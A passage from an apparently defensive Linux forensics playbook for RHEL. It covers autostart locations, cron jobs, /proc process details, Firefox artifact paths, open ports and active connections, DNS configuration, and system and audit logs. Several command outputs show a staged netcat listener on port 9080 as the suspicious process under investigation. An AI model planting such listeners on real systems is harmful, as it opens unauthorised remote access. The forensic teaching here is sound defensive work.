In order to have services autostart, the unit configuration file needs to be placed in the appropriate directory<sup class="footnote-reference"><a href="#chapters-10-2-autostart-wanted_by">1</a></sup><sup class="footnote-reference"><a href="#chapters-10-2-autostart-run_level_tgt">2</a></sup><sup class="footnote-reference"><a href="#chapters-10-2-autostart-run_tgt">3</a></sup>. </p>
<ul>
<li><code>/usr/lib/systemd/system/</code>: Systemd unit files distributed with installed RPM packages. </li>
<li><code>/run/systemd/system/</code>: Systemd unit files created at run time. This directory takes precedence over the directory with installed service unit files. </li>
<li><code>/etc/systemd/system/</code>: Systemd unit files created by systemctl enable as well as unit files added for extending a service. This directory takes precedence over the directory with runtime unit files. </li>
</ul>
<p>Previous versions of Redhat used <code>/etc/rc.d/init.d/</code>. These are written in BASH scripts. This folder location should be reviewed and any scripts should be thoroughly examined. </p>
<div class="table-wrapper"><table><thead><tr><th>Run Lvl</th><th>Target Units</th><th>Description<sup class="footnote-reference"><a href="#chapters-10-2-autostart-run_tgt">3</a></sup></th></tr></thead><tbody>
<tr><td>0</td><td>runlevel0.target, poweroff.target</td><td>Shut down and power off</td></tr>
<tr><td>1</td><td>runlevel1.target, rescue.target</td><td>Set up a rescue shell</td></tr>
<tr><td>2,3,4</td><td>runlevel[234].target, multi-user.target</td><td>Set up a non-gfx multi-user shell</td></tr>
<tr><td>5</td><td>runlevel5.target, graphical.target</td><td>Set up a gfx multi-user shell</td></tr>
<tr><td>6</td><td>runlevel6.target, reboot.target</td><td>Shut down and reboot the system</td></tr>
</tbody></table>
</div>
<p>Note that all the services defined are not <code>enabled</code>. </p>
<p>In order to get a list of all enabled services, the symlinks from the various run levels need to be examined. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc system]$ ls -l multi-user.target.wants
total 0
lrwxrwxrwx. 1 root root 35 Jun 14 02:28 atd.service -&gt; /usr/lib/systemd/system/atd.service
lrwxrwxrwx. 1 root root 38 Jun 14 02:26 auditd.service -&gt; /usr/lib/systemd/system/auditd.service
lrwxrwxrwx. 1 root root 44 Jun 14 02:26 avahi-daemon.service -&gt; /usr/lib/systemd/system/avahi-daemon.service
lrwxrwxrwx. 1 root root 39 Jun 14 02:28 chronyd.service -&gt; /usr/lib/systemd/system/chronyd.service
lrwxrwxrwx. 1 root root 37 Jun 14 02:26 crond.service -&gt; /usr/lib/systemd/system/crond.service
lrwxrwxrwx. 1 root root 33 Jun 14 02:27 cups.path -&gt; /usr/lib/systemd/system/cups.path
lrwxrwxrwx. 1 root root 36 Jun 14 02:27 cups.service -&gt; /usr/lib/systemd/system/cups.service
lrwxrwxrwx. 1 root root 41 Jun 14 02:28 firewalld.service -&gt; /usr/lib/systemd/system/firewalld.service
</code></pre>
<p>As seen below, there are several <code>.wants</code> defined in RHEL. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc system]$ ls | grep wants
basic.target.wants
bluetooth.target.wants
default.target.wants
dev-virtio\x2dports-org.qemu.guest_agent.0.device.wants
getty.target.wants
graphical.target.wants
local-fs.target.wants
multi-user.target.wants
network-online.target.wants
printer.target.wants
remote-fs.target.wants
sockets.target.wants
sysinit.target.wants
timers.target.wants

</code></pre>
<h2 id="chapters-10-2-autostart-xdg-autostart"><a class="header" href="#chapters-10-2-autostart-xdg-autostart">XDG autostart</a></h2>
<p>XDG autostart defines a specification to start applications automatically when a desktop environment is started. It does this by placing <code>.desktop</code> files in specific directories. The directories that are used for XDG autostart are<sup class="footnote-reference"><a href="#chapters-10-2-autostart-xdg">4</a></sup>:</p>
<pre><code class="language-bash">~/.config/autostart (user-specific)
/etc/xdg/autostart (system-wide)
</code></pre>
<p>The most important key in a .desktop file for XDG autostart is the Exec key, which specifies the command that should be run when the application is started.</p>
<p>For example, the vmware-user.desktop file contents are as follows. The Exec defined here is <code>/usr/bin/vmware-user-suid-wrapper</code> will be launched automatically. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc etc]$ cat /etc/xdg/autostart/vmware-user.desktop 
[Desktop Entry]
Type=Application

Exec=/usr/bin/vmware-user-suid-wrapper
Name=VMware User Agent
# KDE bug 190522: KDE does not autostart items with NoDisplay=true...
# NoDisplay=true
X-KDE-autostart-phase=1
</code></pre>
<h2 id="chapters-10-2-autostart-scripts"><a class="header" href="#chapters-10-2-autostart-scripts">Scripts</a></h2>
<p><code>.bashrc</code> file is a script that's executed whenever a new terminal session is opened in interactive mode. It's often used for setting environment variables, defining functions, or customizing the command prompt.</p>
<p><code>.bash_profile</code> and <code>.bash_login</code>are similar to .bashrc, but are executed when a login shell session is started, which typically happens when a user logs on at the console, through ssh, or with the su - username command.</p>
<p>These scripts should also be reviewed for malicious actions. </p>
<p><sup class="footnote-reference"><a href="#chapters-10-2-autostart-autostart_loc">5</a></sup> <a href="https://superuser.com/questions/594819/getting-list-of-startup-application-in-linux">https://superuser.com/questions/594819/getting-list-of-startup-application-in-linux</a></p>
<p><sup class="footnote-reference"><a href="#chapters-10-2-autostart-rhel_systemd">6</a></sup> <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/chap-managing_services_with_systemd">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/chap-managing_services_with_systemd</a> </p>
<div class="footnote-definition" id="chapters-10-2-autostart-xdg"><sup class="footnote-definition-label">4</sup>
<p><a href="https://specifications.freedesktop.org/desktop-entry-spec/latest/">https://specifications.freedesktop.org/desktop-entry-spec/latest/</a></p>
</div>
<div class="footnote-definition" id="chapters-10-2-autostart-wanted_by"><sup class="footnote-definition-label">1</sup>
<p><a href="https://unix.stackexchange.com/questions/506347/why-do-most-systemd-examples-contain-wantedby-multi-user-target">https://unix.stackexchange.com/questions/506347/why-do-most-systemd-examples-contain-wantedby-multi-user-target</a></p>
</div>
<div class="footnote-definition" id="chapters-10-2-autostart-run_level_tgt"><sup class="footnote-definition-label">2</sup>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_basic_system_settings/working-with-systemd-targets_configuring-basic-system-settings">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_basic_system_settings/working-with-systemd-targets_configuring-basic-system-settings</a></p>
</div>
<div class="footnote-definition" id="chapters-10-2-autostart-run_tgt"><sup class="footnote-definition-label">3</sup>
<p><a href="https://unix.stackexchange.com/questions/404667/systemd-service-what-is-multi-user-target/404671">https://unix.stackexchange.com/questions/404667/systemd-service-what-is-multi-user-target/404671</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-13-persistence_forensics"></div><h1 id="chapters-13-persistence_forensics-forensic-artifacts"><a class="header" href="#chapters-13-persistence_forensics-forensic-artifacts">Forensic Artifacts</a></h1>
<h2 id="chapters-13-persistence_forensics-scheduled-jobs"><a class="header" href="#chapters-13-persistence_forensics-scheduled-jobs">Scheduled Jobs</a></h2>
<p><strong>Collect the crontab files</strong></p>
<p>Each line of these files will have to be analyzed, and the executable file or script will need to be extracted for further analysis. </p>
<pre><code class="language-bash"># system wide
/etc/crontab
/etc/anacrontab
/var/spool/at/&lt;Jobs&gt;
# user specific
/var/spool/cron/&lt;user_id&gt;
/var/spool/anacron/&lt;user_id&gt;
</code></pre>
<p><strong>Collect script files from the following folders</strong></p>
<pre><code class="language-bash">/etc/cron.d
/etc/cron.hourly
/etc/cron.daily
/etc/cron.weekly
/etc/cron.monthly
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-14-execution"></div><h1 id="chapters-14-execution-process-execution"><a class="header" href="#chapters-14-execution-process-execution">Process Execution</a></h1>
<h2 id="chapters-14-execution-shell-history"><a class="header" href="#chapters-14-execution-shell-history">Shell History</a></h2>
<p>Shell history, such as <code>.bash_history</code>, can record the list of commands that users ran. However, they are also the least reliable. For example, somebody can easily manipulate the shell history, modify it or clear it completely. Deleting the <code>.bash_history</code> file will also delete all records with it. </p>
<p>The history is also only written when the shell is closed. If a user has multiple simultaneous shell sessions, then commands can get overridden, and the ordering of the history will be lost. Shell history also does not track when a command was executed or its output. This lack of context further limits its suitability for forensic analysis. </p>
<h2 id="chapters-14-execution-live-process"><a class="header" href="#chapters-14-execution-live-process">Live Process</a></h2>
<p>Live process information can be obtained from the <code>/proc</code> directory <sup class="footnote-reference"><a href="#chapters-14-execution-proc_man">1</a></sup>. Each currently running process has a subdirectory named with its PID under<code>/proc</code>. This directory contains a great deal of information about the process, including its current status, the command line that started the process, working directory etc.</p>
<p>For forensic examination, the following attributes are valuable. </p>
<p><code>Process Identifier (PID)</code>: The unique ID assigned to each process during its creation. It is crucial for process management and control.</p>
<p><code>Parent Process Identifier (PPID)</code>: The unique ID of the process that created the current process. This can be useful in understanding process hierarchies and dependencies.</p>
<p><code>Path</code>: The file path to the executable file running as this process. This indicates the process's origin.</p>
<p><code>Arguments</code>: The command-line arguments that were passed to the process at its launch. These can affect the process's behavior in significant ways.</p>
<p><code>Execution Start Time</code>: The start time of a process.</p>
<p><code>Loaded Objects</code>: Information about shared libraries and other objects that the process has loaded into memory. This could be key in diagnosing issues related to libraries.</p>
<p><code>User</code>: The user account that owns and controls the process. This is important for considerations of permissions and security.</p>
<h3 id="chapters-14-execution-procpidstat--procpidstatusfile"><a class="header" href="#chapters-14-execution-procpidstat--procpidstatusfile"><code>/proc/[pid]/stat</code> / <code>/proc/[pid]/status</code>file</a></h3>
<p>The <code>/proc/[pid]/stat</code> file <sup class="footnote-reference"><a href="#chapters-14-execution-proc_man">1</a></sup> in the Linux filesystem provides a wealth of information about a specific process, identified by its process ID (PID). The file contains a single line of text, with different fields separated by spaces.</p>
<p>The <code>/proc/[pid]/status</code> also provides much of the same information in a human readable form. </p>
<p>The fields that are of interest for analysis here are <code>Name</code>, <code>Pid</code>, <code>PPid</code>. The <code>PPid</code> can be used to lookup the parent process and check to see if there are any abnormal process launch or hierarchy issues. </p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc 71520]$ cat /proc/71520/status 
Name:	nc
Umask:	0022
State:	S (sleeping)
Tgid:	71520
Ngid:	0
Pid:	71520
PPid:	40918
... 
</code></pre>
<h3 id="chapters-14-execution-command-line-arguments-used"><a class="header" href="#chapters-14-execution-command-line-arguments-used">Command line arguments used</a></h3>
<p>The command line used to launch the process can be looked up from the <code>cmdline</code> file.</p>
<pre><code class="language-bash">cat cmdline
</code></pre>
<h3 id="chapters-14-execution-procpidexe"><a class="header" href="#chapters-14-execution-procpidexe"><code>/proc/[pid]/exe</code></a></h3>
<p>The executable as well as the launch time can be found by listing the exe.</p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc 71520]$ ls -l exe
lrwxrwxrwx. 1 tlasso tlasso 0 Jul 10 01:38 exe -&gt; /usr/bin/ncat
</code></pre>
<h3 id="chapters-14-execution-loaded-shared-lib"><a class="header" href="#chapters-14-execution-loaded-shared-lib">Loaded shared lib</a></h3>
<p>Shared libs loaded by the process can be displayed using the <code>ldd</code> command.</p>
<pre><code class="language-bash">[tlasso@rhel-richmondfc 71520]$ ldd /usr/bin/ncat
	linux-vdso.so.1 (0x00007ffc8b373000)
	libssl.so.3 =&gt; /lib64/libssl.so.3 (0x00007fad435f5000)
	libcrypto.so.3 =&gt; /lib64/libcrypto.so.3 (0x00007fad43000000)
	libpcap.so.1 =&gt; /lib64/libpcap.so.1 (0x00007fad435a7000)
	libm.so.6 =&gt; /lib64/libm.so.6 (0x00007fad434cc000)
	libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fad42c00000)
	libz.so.1 =&gt; /lib64/libz.so.1 (0x00007fad434b2000)
	libibverbs.so.1 =&gt; /lib64/libibverbs.so.1 (0x00007fad4348e000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fad4370f000)
	libnl-route-3.so.200 =&gt; /lib64/libnl-route-3.so.200 (0x00007fad42f6f000)
	libnl-3.so.200 =&gt; /lib64/libnl-3.so.200 (0x00007fad4346a000)
	libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007fad4344f000)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-16-webhistory"></div><h1 id="chapters-16-webhistory-web-artifacts"><a class="header" href="#chapters-16-webhistory-web-artifacts">Web Artifacts</a></h1>
<p>Web artifacts are digital traces that are left behind by web browsers and other applications. These artifacts can include the user's browsing history, cookies, cache, and other data. This data can help investigators reconstruct the sequence of events leading up to a cyber incident, identify potential attack vectors, or uncover crucial evidence. For instance, forensic analysis of these artifacts can reveal the presence of malicious sites in a user's browsing history, indicating a possible malware infection vector. Similarly, an unexpected cookie could signify an attacker's attempts to maintain persistence or steal data.</p>
<h2 id="chapters-16-webhistory-browser-history"><a class="header" href="#chapters-16-webhistory-browser-history">Browser History</a></h2>
<pre><code class="language-bash">    $users.homedir/.mozilla/firefox/*/places.sqlite
    $users.homedir/.mozilla/firefox/*/places.sqlite-wal
</code></pre>
<h2 id="chapters-16-webhistory-browser-cache"><a class="header" href="#chapters-16-webhistory-browser-cache">Browser Cache</a></h2>
<pre><code class="language-bash">    $users.homedir/.cache/mozilla/firefox/*.default/Cache/*
    $users.homedir/.cache/mozilla/firefox/*.default/cache2/*
    $users.homedir/.cache/mozilla/firefox/*.default/cache2/doomed/*
    $users.homedir/.cache/mozilla/firefox/*.default/cache2/entries/*
    $users.homedir/.cache/mozilla/firefox/*.default-*/Cache/*
    $users.homedir/.cache/mozilla/firefox/*.default-*/cache2/*
    $users.homedir/.cache/mozilla/firefox/*.default-*/cache2/doomed/*
    $users.homedir/.cache/mozilla/firefox/*.default-*/cache2/entries/*
</code></pre>
<h2 id="chapters-16-webhistory-downloads"><a class="header" href="#chapters-16-webhistory-downloads">Downloads</a></h2>
<pre><code class="language-bash">    $users.homedir/.mozilla/firefox/*/downloads.sqlite
    $users.homedir/.mozilla/firefox/*/downloads.sqlite-wal
</code></pre>
<h2 id="chapters-16-webhistory-cookies"><a class="header" href="#chapters-16-webhistory-cookies">Cookies</a></h2>
<pre><code class="language-bash">   $users.homedir/.mozilla/firefox/*/cookies.sqlite
   $users.homedir/.mozilla/firefox/*/cookies.sqlite-shm
   $users.homedir/.mozilla/firefox/*/cookies.sqlite-wal
</code></pre>
<h2 id="chapters-16-webhistory-addons"><a class="header" href="#chapters-16-webhistory-addons">Addons</a></h2>
<pre><code class="language-bash">   $users.homedir/.mozilla/firefox/*/addons.json
   $users.homedir/.mozilla/firefox/*/extensions.json
   $users.homedir/.mozilla/firefox/*/webapps/webapps.json
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-17-open_ports_active_conn"></div><h1 id="chapters-17-open_ports_active_conn-open-ports--active-connections"><a class="header" href="#chapters-17-open_ports_active_conn-open-ports--active-connections">Open Ports / Active Connections</a></h1>
<p>Active connections and open ports are a critical part of an investigation. However, one of the challenges in this process is that historical information about port activity is not recorded on the host, making it difficult to trace back and identify patterns of an intrusion. Despite this limitation, when a cyber incident occurs, investigating open ports helps to determine the vector of the attack, identify what services or data might have been compromised, and evaluate the extent of the intrusion.</p>
<h2 id="chapters-17-open_ports_active_conn-listening-ports"><a class="header" href="#chapters-17-open_ports_active_conn-listening-ports">Listening Ports</a></h2>
<p>There are a few ways to list process along with open port in Linux. Here are the most common methods:</p>
<h3 id="chapters-17-open_ports_active_conn-netstat-command"><a class="header" href="#chapters-17-open_ports_active_conn-netstat-command">netstat command</a></h3>
<p>The <code>netstat</code> command can be used to display a variety of network information, including open ports. To list process along with open port using <code>netstat</code>, use the following:</p>
<pre><code class="language-bash">netstat -tulpn

</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc 37822]$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9080            0.0.0.0:*               LISTEN      71520/nc            
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::9080                 :::*                    LISTEN      71520/nc            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:43449           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:49428           0.0.0.0:*                           40401/firefox       
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::49008                :::*                                -                   
udp6       0      0 ::1:323                 :::*                                -                   


</code></pre>
<h3 id="chapters-17-open_ports_active_conn-ss-command"><a class="header" href="#chapters-17-open_ports_active_conn-ss-command">ss command</a></h3>
<p>The <code>ss</code> command<sup class="footnote-reference"><a href="#chapters-17-open_ports_active_conn-man_ss">1</a></sup> is a newer alternative to <code>netstat</code> and can be used to dump socket statistics. To list process along with open port using <code>ss</code>, use the following :</p>
<pre><code class="language-bash">ss -tulpn

</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc 37822]$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port   Process                                
udp     UNCONN   0        0                0.0.0.0:43449            0.0.0.0:*                                             
udp     UNCONN   0        0                0.0.0.0:5353             0.0.0.0:*                                             
udp     UNCONN   0        0                0.0.0.0:49428            0.0.0.0:*       users:((&quot;firefox&quot;,pid=40401,fd=53))   
udp     UNCONN   0        0              127.0.0.1:323              0.0.0.0:*                                             
udp     UNCONN   0        0                   [::]:5353                [::]:*                                             
udp     UNCONN   0        0                   [::]:49008               [::]:*                                             
udp     UNCONN   0        0                  [::1]:323                 [::]:*                                             
tcp     LISTEN   0        128            127.0.0.1:631              0.0.0.0:*                                             
tcp     LISTEN   0        10               0.0.0.0:9080             0.0.0.0:*       users:((&quot;nc&quot;,pid=71520,fd=4))         
tcp     LISTEN   0        128              0.0.0.0:22               0.0.0.0:*                                             
tcp     LISTEN   0        128                [::1]:631                 [::]:*                                             
tcp     LISTEN   0        10                  [::]:9080                [::]:*       users:((&quot;nc&quot;,pid=71520,fd=3))         
tcp     LISTEN   0        128                 [::]:22                  [::]:*                     

</code></pre>
<h2 id="chapters-17-open_ports_active_conn-active-connections"><a class="header" href="#chapters-17-open_ports_active_conn-active-connections">Active Connections</a></h2>
<p><code>lsof</code> - &quot;List Open Files&quot;<sup class="footnote-reference"><a href="#chapters-17-open_ports_active_conn-lsof">2</a></sup> is an excellent tool when working with a live system. It provides a detailed view of the system and displays information about files that are opened by processes, including network connections. <sup class="footnote-reference"><a href="#chapters-17-open_ports_active_conn-lsof_man">3</a></sup></p>
<pre><code class="language-bash">lsof -i -n -P

</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc 37822]$ lsof -i -n -P
COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
firefox 40401 tlasso   55u  IPv4 755700      0t0  TCP 172.23.49.52:35546-&gt;34.117.65.55:443 (ESTABLISHED)
firefox 40401 tlasso   60u  IPv4 779282      0t0  TCP 172.23.49.52:45388-&gt;142.250.205.228:443 (ESTABLISHED)
firefox 40401 tlasso   61u  IPv4 775820      0t0  TCP 172.23.49.52:34942-&gt;34.149.100.209:443 (ESTABLISHED)
firefox 40401 tlasso   62u  IPv4 775821      0t0  TCP 172.23.49.52:58550-&gt;34.120.115.102:443 (ESTABLISHED)
firefox 40401 tlasso   63u  IPv4 778293      0t0  TCP 172.23.49.52:53024-&gt;34.120.237.76:443 (ESTABLISHED)
firefox 40401 tlasso   77u  IPv4 777822      0t0  TCP 172.23.49.52:48046-&gt;142.250.77.131:80 (ESTABLISHED)
firefox 40401 tlasso   78u  IPv4 780293      0t0  TCP 172.23.49.52:50414-&gt;49.44.116.245:80 (ESTABLISHED)
firefox 40401 tlasso   80u  IPv4 777823      0t0  TCP 172.23.49.52:48054-&gt;142.250.77.131:80 (ESTABLISHED)
firefox 40401 tlasso   81u  IPv4 771854      0t0  TCP 172.23.49.52:45404-&gt;142.250.205.228:443 (ESTABLISHED)
firefox 40401 tlasso  101u  IPv4 777824      0t0  TCP 172.23.49.52:48068-&gt;142.250.77.131:80 (ESTABLISHED)
firefox 40401 tlasso  111u  IPv4 772047      0t0  TCP 172.23.49.52:48566-&gt;142.250.183.238:443 (ESTABLISHED)
firefox 40401 tlasso  119u  IPv4 772053      0t0  TCP 172.23.49.52:52668-&gt;172.217.163.162:443 (ESTABLISHED)
firefox 40401 tlasso  123u  IPv4 775005      0t0  TCP 172.23.49.52:55100-&gt;142.250.195.131:443 (ESTABLISHED)
firefox 40401 tlasso  132u  IPv4 772049      0t0  TCP 172.23.49.52:34382-&gt;172.217.167.130:443 (ESTABLISHED)
firefox 40401 tlasso  149u  IPv4 775871      0t0  TCP 172.23.49.52:40670-&gt;142.250.183.226:443 (ESTABLISHED)
nc      71520 tlasso    3u  IPv6 752595      0t0  TCP *:9080 (LISTEN)
nc      71520 tlasso    4u  IPv4 752596      0t0  TCP *:9080 (LISTEN)
</code></pre>
<div class="footnote-definition" id="chapters-17-open_ports_active_conn-man_ss"><sup class="footnote-definition-label">1</sup>
<p><a href="https://www.man7.org/linux/man-pages/man8/ss.8.html">https://www.man7.org/linux/man-pages/man8/ss.8.html</a></p>
</div>
<div class="footnote-definition" id="chapters-17-open_ports_active_conn-lsof"><sup class="footnote-definition-label">2</sup>
<p><a href="https://www.redhat.com/sysadmin/analyze-processes-lsof">https://www.redhat.com/sysadmin/analyze-processes-lsof</a></p>
</div>
<div class="footnote-definition" id="chapters-17-open_ports_active_conn-lsof_man"><sup class="footnote-definition-label">3</sup>
<p><a href="https://linux.die.net/man/8/lsof">https://linux.die.net/man/8/lsof</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-19-dns_cache"></div><h1 id="chapters-19-dns_cache-dns-cache"><a class="header" href="#chapters-19-dns_cache-dns-cache">DNS Cache</a></h1>
<p>DNS records can provide crucial insights into network communications, identify malicious activities and uncover connections between compromised systems and C2 servers.</p>
<p>Cache records can be found in the </p>
<h3 id="chapters-19-dns_cache-configuration-files"><a class="header" href="#chapters-19-dns_cache-configuration-files">Configuration files</a></h3>
<p>DNS-related configuration files may contain valuable information. </p>
<p><code>/etc/resolv.conf</code>: Specifies the DNS servers used by the system.</p>
<p><code>/etc/hosts</code>: Contains local hostname-to-IP mappings.</p>
<h3 id="chapters-19-dns_cache-dns-caching-in-rhel"><a class="header" href="#chapters-19-dns_cache-dns-caching-in-rhel">DNS caching in RHEL</a></h3>
<p>RHEL does not cache DNS queries by default<sup class="footnote-reference"><a href="#chapters-19-dns_cache-dns_default">1</a></sup>. RHEL also does not recommend using any resolvers<sup class="footnote-reference"><a href="#chapters-19-dns_cache-rhel_rec">2</a></sup>. This implies that DNS caching artifacts may not be available for analysis. </p>
<h3 id="chapters-19-dns_cache-dns-resolver"><a class="header" href="#chapters-19-dns_cache-dns-resolver">DNS resolver</a></h3>
<p>Resolver configuration is stored in the <code>/etc/resolv.conf</code> file. This file should be reviewed as part of the investigation to check for any malicious entries. </p>
<pre><code class="language-bash">cat /etc/resolv.conf
</code></pre>
<div class="footnote-definition" id="chapters-19-dns_cache-dns_default"><sup class="footnote-definition-label">1</sup>
<p><a href="https://access.redhat.com/solutions/2189381">https://access.redhat.com/solutions/2189381</a></p>
</div>
<div class="footnote-definition" id="chapters-19-dns_cache-rhel_rec"><sup class="footnote-definition-label">2</sup>
<p><a href="https://access.redhat.com/solutions/6985629">https://access.redhat.com/solutions/6985629</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-01-log_analysis"></div><h1 id="chapters-21-01-log_analysis-log-analysis"><a class="header" href="#chapters-21-01-log_analysis-log-analysis">Log Analysis</a></h1>
<p>Log files are a valuable source of information for digital forensic investigators. They can provide insights into a wide range of events, including user activity, system changes, and security incidents. In RHEL, log files are stored in the <code>/var/log</code> directory.</p>
<p>The following log files are discussed in depth in this playbook. </p>
<ul>
<li>
<p><code>/var/log/audit/audit.log</code>: This log contains records of all security-relevant events, such as file access, process creation, and network connections.</p>
</li>
<li>
<p><code>/var/log/messages</code>:  The <code>messages</code> file is a system log file that contains all global system messages, including the messages that are logged during system startup. The configuration for this log is done in the <code>/etc/rsyslog.conf</code> file.</p>
</li>
<li>
<p><code>/var/log/secure</code>: The <code>secure</code> file is a security log file that contains all security-related messages, including authentication failures. It also tracks sudo logins, SSH logins and other errors logged by system security services daemon. The configuration for this log is done in the <code>/etc/rsyslog.conf</code> file. </p>
</li>
<li>
<p><code>/var/log/btmp</code>: The <code>btmp</code> file is a system log file in Linux that keeps a record of failed logon attempts.</p>
</li>
<li>
<p><code>/var/log/wtmp</code>: The <code>wtmp</code> file keeps track of the successful logons including logoff.</p>
</li>
<li>
<p><code>/var/log/cron</code>: Schedule task execution history log. </p>
</li>
<li>
<p><code>/var/log/dnf*, /var/log/anaconda</code>: These logs offer a comprehensive timeline of application changes on a system from installation to the present.</p>
</li>
</ul>
<p>Log file analysis for forensics comes with its own set of challenges and pitfalls.</p>
<p>Log files can be manipulated by attackers to cover their tracks. For example, an attacker might delete or modify log files to remove evidence of their activity. It is important for forensic investigators to be aware of these potential pitfalls and to take steps to verify the integrity of log files.</p>
<p>Another important consideration for log file analysis is log rotation. Log rotation is the process of automatically moving old log files to a different location or deleting them altogether. This is done to prevent log files from becoming too large and to ensure that only the most recent log files are kept. However, log rotation can also make it more difficult for forensic investigators to access historical log data.</p>
<h2 id="chapters-21-01-log_analysis-log-configuration"><a class="header" href="#chapters-21-01-log_analysis-log-configuration">Log configuration</a></h2>
<p>RHEL9 defaults to using rsyslog for log management. rsyslog configuration is maintained in the <code>/etc/rsyslog.conf</code> file. Please review the rsyslog documentation to learn its capabilities<sup class="footnote-reference"><a href="#chapters-21-01-log_analysis-rsyslog">1</a></sup> <sup class="footnote-reference"><a href="#chapters-21-01-log_analysis-rhel_rsyslog">2</a></sup> <sup class="footnote-reference"><a href="#chapters-21-01-log_analysis-rhel_rsyslog2">3</a></sup>. Note that the above log files may be altered by changing the log settings in the conf file. 
Ensure that the configurations has not been tampered with by comparing it with corporate baselines or policies. </p>
<div class="footnote-definition" id="chapters-21-01-log_analysis-rsyslog"><sup class="footnote-definition-label">1</sup>
<p><a href="https://www.rsyslog.com/doc/v8-stable/configuration/index.html">https://www.rsyslog.com/doc/v8-stable/configuration/index.html</a> 
<sup class="footnote-reference"><a href="#chapters-21-01-log_analysis-rhel_rsyslog">2</a></sup>: <a href="https://www.redhat.com/sysadmin/log-aggregation-rsyslog">https://www.redhat.com/sysadmin/log-aggregation-rsyslog</a>
<sup class="footnote-reference"><a href="#chapters-21-01-log_analysis-rhel_rsyslog2">3</a></sup>: <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/security_hardening/assembly_configuring-a-remote-logging-solution_security-hardening#the-rsyslog-logging-service_assembly_configuring-a-remote-logging-solution">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/security_hardening/assembly_configuring-a-remote-logging-solution_security-hardening#the-rsyslog-logging-service_assembly_configuring-a-remote-logging-solution</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-02-audit_log"></div><h1 id="chapters-21-02-audit_log-audit-log"><a class="header" href="#chapters-21-02-audit_log-audit-log">Audit Log</a></h1>
<p>The <code>audit.log</code> file is the default log file used by the Linux Audit system, where it records system events based on the rules defined by the system administrator. This file typically includes information such as timestamps, event types, success or failure status, and other relevant details for each event. It is usually located in the <code>/var/log/audit/</code> directory. The <code>audit.log</code> file serves as a comprehensive audit trail, and it can be used for  forensic investigations to understand actions that were performed on a system.<sup class="footnote-reference"><a href="#chapters-21-02-audit_log-tenable_log">1</a></sup></p>
<p>Here is an example log record.</p>
<pre><code class="language-bash">type=SYSCALL msg=audit(1626369130.992:9876): arch=c000003e syscall=2 success=yes exit=3 a0=7ffeefbff4f0 a1=941 a2=1b6 a3=7ffeefbff4c0 items=2 ppid=2636 pid=2637 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=2 comm=&quot;touch&quot; exe=&quot;/usr/bin/touch&quot; key=&quot;file-create&quot;
</code></pre>
<ul>
<li>
<p><code>type=SYSCALL</code>: This is a system call event. The Linux kernel has provided a mechanism for user space applications to request services from the kernel, which is known as a system call.</p>
</li>
<li>
<p><code>msg=audit(1626369130.992:9876)</code>: This is a unique identifier for the audit event. The timestamp is followed by the audit event ID.</p>
</li>
<li>
<p><code>arch=c000003e</code>: This is the architecture from which the syscall originates. c000003e corresponds to x86_64.</p>
</li>
<li>
<p><code>syscall=2</code>: This is the system call number. 2 corresponds to the open syscall on an x86_64 system.</p>
</li>
<li>
<p><code>success=yes</code>: Indicates whether the system call was successful.</p>
</li>
<li>
<p><code>exit=3</code>: The exit value of the system call.</p>
</li>
<li>
<p><code>a0=7ffeefbff4f0 a1=941 a2=1b6 a3=7ffeefbff4c0</code>: These are the hexadecimal representations of the system call arguments.</p>
</li>
<li>
<p><code>items=2</code>: The number of path records that are associated with this event.</p>
</li>
<li>
<p><code>ppid=2636 pid=2637</code>: The process ID (pid) of the process making the system call, and the parent process ID (ppid).</p>
</li>
<li>
<p><code>auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000</code>: Various user and group identifiers. auid is the Audit User ID, uid and gid are the User ID and Group ID, euid and egid are the effective User ID and Group ID, suid and sgid are the Saved User ID and Group ID, fsuid and fsgid are the filesystem User ID and Group ID.</p>
</li>
<li>
<p><code>tty=pts0</code>: The controlling terminal of the process.</p>
</li>
<li>
